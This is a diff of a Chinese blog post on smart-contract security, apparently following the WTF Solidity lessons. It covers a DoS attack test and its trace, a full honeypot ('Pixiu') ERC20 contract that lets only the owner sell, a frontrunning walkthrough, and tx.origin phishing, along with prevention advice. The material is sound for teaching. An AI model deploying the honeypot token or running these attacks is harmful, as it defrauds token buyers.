+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function test_DoSGameAttack() public &#123;<br>    vm.startPrank(user);<br>    uint256 Before = doSGame.balance();<br>    console.log(&quot;doSGame.balance Before is  &quot;, Before);<br>    doSGameAttack = new DoSGameAttack(); //实例化攻击合约<br>    doSGameAttack.attack&#123;value: 3 * 1e18&#125;(address(doSGame));<br>    doSGame.refund();<br>    uint256 After = doSGame.balance();<br>    console.log(&quot;doSGame.balance After is  &quot;, After);<br>    vm.stopPrank();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>运行结果：无法赎回，为什么呢？因为在攻击合约里面定义了fallback回调函数，里面抛出了一个revert导致回调失败，无法赎回</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">[268726] DoSGameAttackTest::test_DoSGameAttack()<br>  ├─ [0] VM::startPrank(testUser: [0xF7DFAA7B4230fdc795e8C6430834Cf309aF893bA])<br>  │   └─ ← [Return]<br>  ├─ [378] DoSGame::balance() [staticcall]<br>  │   └─ ← [Return] 0<br>  ├─ [0] console::log(&quot;doSGame.balance Before is  &quot;, 0) [staticcall]<br>  │   └─ ← [Stop]<br>  ├─ [106751] → new DoSGameAttack@0xb8BE0Cc57897f40C22410548f33B2750cb01E14f<br>  │   └─ ← [Return] 533 bytes of code<br>  ├─ [76392] DoSGameAttack::attack&#123;value: 3000000000000000000&#125;(DoSGame: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])<br>  │   ├─ [68935] DoSGame::deposit&#123;value: 3000000000000000000&#125;()<br>  │   │   └─ ← [Stop]<br>  │   └─ ← [Stop]<br>  ├─ [8756] DoSGame::refund()<br>  │   ├─ [335] DoSGameAttack::fallback&#123;value: 3000000000000000000&#125;()<br>  │   │   └─ ← [Revert] DoS Attack!<br>  │   └─ ← [Revert] Refund Fail!<br>  └─ ← [Revert] Refund Fail!<br></code></pre></td></tr></table></figure>
+
+<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方：</p>
+<ol>
+<li>外部合约的函数调用（例如 <code>call</code>）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 <code>require(success, &quot;Refund Fail!&quot;);</code> 去掉，退款在单个地址失败时仍能继续运行。</li>
+<li>合约不会出乎意料的自毁。</li>
+<li>合约不会进入无限循环。</li>
+<li><code>require</code> 和 <code>assert</code> 的参数设定正确。</li>
+<li>退款时，让用户从合约自行领取（pull），而非批量发送给用户(push)。</li>
+<li>确保回调函数不会影响正常合约运行。</li>
+<li>确保当合约的参与者（例如 <code>owner</code>）永远缺席时，合约的主要业务仍能顺利运行。</li>
+</ol>
+<h1 id="S10-貔貅"><a href="#S10-貔貅" class="headerlink" title="S10. 貔貅"></a>S10. 貔貅</h1><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Pixiu">貔貅</a>是中国的一个神兽，因为在天庭犯了戒，被玉帝揍的肛门封闭了，只能吃不能拉，可以帮人们聚财。但在Web3中，貔貅变为了不详之兽，韭菜的天敌。貔貅盘的特点：投资人只能买不能卖，仅有项目方地址能卖出。（英文习惯叫蜜罐代币 honeypot token）。</p>
+<p>通常一个貔貅盘有如下的生命周期：</p>
+<ol>
+<li>恶意项目方部署貔貅代币合约。</li>
+<li>宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高。</li>
+<li>项目方<code>rug pull</code>卷走资金</li>
+</ol>
+<p>介绍一个极简的ERC20代币貔貅合约<code>Pixiu</code>。在该合约中，只有合约拥有者可以在<code>uniswap</code>出售代币，其他地址不能。</p>
+<p><code>Pixiu</code> 有一个状态变量<code>pair</code>，用于记录<code>uniswap</code>中 <code>Pixiu-ETH LP</code>的币对地址。它主要有三个函数：</p>
+<ol>
+<li>构造函数：初始化代币的名称和代号，并根据 <code>uniswap</code> 和 <code>create2</code> 的原理计算<code>LP</code>合约地址，具体内容可以参考 <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/25_Create2/readme.md">WTF Solidity 第25讲: Create2</a>。这个地址会在 <code>_update()</code> 函数中用到。</li>
+<li><code>mint()</code>：铸造函数，仅 <code>owner</code> 地址可以调用，用于铸造 <code>Pixiu</code> 代币。</li>
+<li><code>_update()</code>：<code>ERC20</code>代币在被转账前会调用的函数。在其中，我们限制了当转账的目标地址 <code>to</code> 为 <code>LP</code> 的时候，也就是韭菜卖出的时候，交易会 <code>revert</code>；只有调用者为<code>owner</code>的时候能够成功。这也是貔貅合约的核心。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 极简貔貅ERC20代币，只能买，不能卖<br>contract HoneyPot is ERC20, Ownable &#123;<br>    address public pair;<br><br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;HoneyPot&quot;, &quot;Pi Xiu&quot;) &#123;<br>        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory<br>        address tokenA = address(this); // 貔貅代币地址<br>        address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; //  goerli WETH<br>        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序<br>        bytes32 salt = keccak256(abi.encodePacked(token0, token1));<br>        // calculate pair address<br>        pair = address(uint160(uint(keccak256(abi.encodePacked(<br>        hex&#x27;ff&#x27;,<br>        factory,<br>        salt,<br>        hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27;<br>        )))));<br>    &#125;<br>    <br>    /**<br>     * 铸造函数，只有合约所有者可以调用<br>     */<br>    function mint(address to, uint amount) public onlyOwner &#123;<br>        _mint(to, amount);<br>    &#125;<br><br>    /**<br>     * @dev See &#123;ERC20-_update&#125;.<br>     * 貔貅函数：只有合约拥有者可以卖出<br>    */<br>    function _update(<br>      address from,<br>      address to,<br>      uint256 amount<br>  ) internal virtual override &#123;<br>     if(to == pair)&#123;<br>        require(from == owner(), &quot;Can not Transfer&quot;);<br>      &#125;<br>      super._update(from, to, amount);<br>  &#125;<br>  // 为什么是_update？<br>  // 注意override是重写，重写了父合约ERC20的_update<br>  // 而父合约ERC20的_update方法，就是更新所有人，就是转移，本来属于你的1个币转移给另一个人了，这就是update<br>  // 这里重写_update 当转移的to地址是pair地址时，触发校验，要求from必须是 owner，<br>  // 也就是说只有owner才可以向pair合约转账<br>  // 也就代表自由owner才可以向uniswap卖币<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="S11-抢先交易"><a href="#S11-抢先交易" class="headerlink" title="S11. 抢先交易"></a>S11. 抢先交易</h1><h3 id="链上抢跑"><a href="#链上抢跑" class="headerlink" title="链上抢跑"></a>链上抢跑</h3><p>链上抢跑指的是搜索者或矿工通过调高<code>gas</code>或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而<code>MEV</code>是衡量这种利润的指标。</p>
+<p>在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些<code>MEV</code>机器人也会搜索<code>mempool</code>中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的<code>swap</code>交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。</p>
+<p><img src="/img/web3/S11-1.png" srcset="/img/loading.gif" lazyload alt="S11-1"></p>
+<h2 id="抢跑实践"><a href="#抢跑实践" class="headerlink" title="抢跑实践"></a>抢跑实践</h2><p>如果你学会了抢跑，你就算是入门的币圈科学家了。接下来，让我们实践一下，抢跑一笔铸造NFT的交易。我们将会用到的工具：</p>
+<ul>
+<li><code>Foundry</code>的<code>anvil</code>工具搭建本地测试链，请提前安装好 <a target="_blank" rel="noopener" href="https://book.getfoundry.sh/getting-started/installation">foundry</a>。</li>
+<li><code>remix</code>进行NFT合约的部署和铸造</li>
+<li><code>etherjs</code>脚本监听<code>mempool</code>并进行抢跑。</li>
+</ul>
+<p><strong>1. 启动Foundry本地测试链：</strong> 在安装好 <code>foundry</code> 之后，在命令行输入 <code>anvil --chain-id 1234 -b 10</code> 搭建本地测试链，chain-id 为 1234，每 10 秒产出一个区块。搭建成功后，它会在显示一些测试账户的地址和私钥，每个账户有 10000 ETH。你可以使用它们进行测试。</p>
+<p><strong>2. 将Remix连接到测试链：</strong> 打开 Remix 的部署页面，打开左上角的<code>Environment</code>下拉菜单，选<code>Foundry Provider</code>即可将 Remix 连接到测试链。</p>
+<p><strong>3. 部署NFT合约：</strong> 在 Remix 上部署一个简单的 freemint（免费铸造）NFT合约。它有一个<code>mint()</code>，用于免费铸造NFT。</p>
+<p><strong>4. 部署ethers.js抢跑脚本：</strong> 简单来说，<code>frontrun.js</code>脚本监听了测试链<code>mempool</code>中的未决交易，筛选出调用了<code>mint()</code>的交易，然后复制它并调高<code>gas</code>进行抢跑。</p>
+<p><strong>5. 调用<code>mint()</code>函数：</strong> 在 Remix 的部署页面调用 Freemint 合约的<code>mint()</code> 函数，进行 NFT 铸造。</p>
+<p><strong>6. 脚本监听到交易并进行抢跑</strong> 我们可以在终端看到 <code>frontrun.js</code> 脚本成功监听到了交易，并进行了抢跑。如果你调用 NFT 合约的 <code>ownerOf()</code> 函数查看 <code>tokenId</code> 为 0 的持有者是抢跑脚本中的钱包地址，证明抢跑成功！。</p>
+<h2 id="预防方法-1"><a href="#预防方法-1" class="headerlink" title="预防方法"></a>预防方法</h2><p>抢先交易是以太坊等公链上普遍存在的问题。我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益：</p>
+<ul>
+<li>使用预提交方案(commit-reveal scheme)。</li>
+<li>使用暗池，用户发出的交易将不进入公开的<code>mempool</code>，而是直接到矿工手里。例如 flashbots 和 TaiChi。</li>
+<li>在调用参数中加上保护性参数，如<a target="_blank" rel="noopener" href="https://uniswapv3book.com/milestone_3/slippage-protection.html">滑点保护</a>，从而减少抢跑者的潜在收益。</li>
+</ul>
+<p>具体操作步骤可以看<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S11_Frontrun">WTF Solidity 合约安全: S11. 抢先交易</a></p>
+<h1 id="S12-tx-origin钓鱼攻击"><a href="#S12-tx-origin钓鱼攻击" class="headerlink" title="S12. tx.origin钓鱼攻击"></a>S12. tx.origin钓鱼攻击</h1><p>上初中的时候特别喜欢玩游戏，但是项目方为了防止未成年人沉迷，规定只有身份证号显示已满十八岁的玩家才不受防沉迷限制。这该怎么办呢？后来自己饿使用家长的身份证号进行年龄验证，并成功绕过了防沉迷系统。这个案例与<code>tx.origin</code>钓鱼攻击有着异曲同工之妙。</p>
+<p>在<code>solidity</code>中，使用<code>tx.origin</code>可以获得启动交易的原始地址，它与<code>msg.sender</code>十分相似，下面我们用一个例子来区分它们之间不同的地方。</p>
+<p>如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，<code>msg.sender</code>就是B合约，而<code>tx.origin</code>就是用户A。如果你不了解<code>call</code>的机制，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md">WTF Solidity极简教程第22讲：Call</a>。</p>
+<p><img src="/img/web3/S12_1.jpg" srcset="/img/loading.gif" lazyload alt="S12-1"></p>
+<p>因此如果一个银行合约使用了<code>tx.origin</code>做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使<code>msg.sender</code>是攻击合约地址，但<code>tx.origin</code>是银行合约拥有者地址，那么转账就有可能成功。</p>
 
                 
               </div>
@@ -544,6 +721,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2025/08/22/after/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
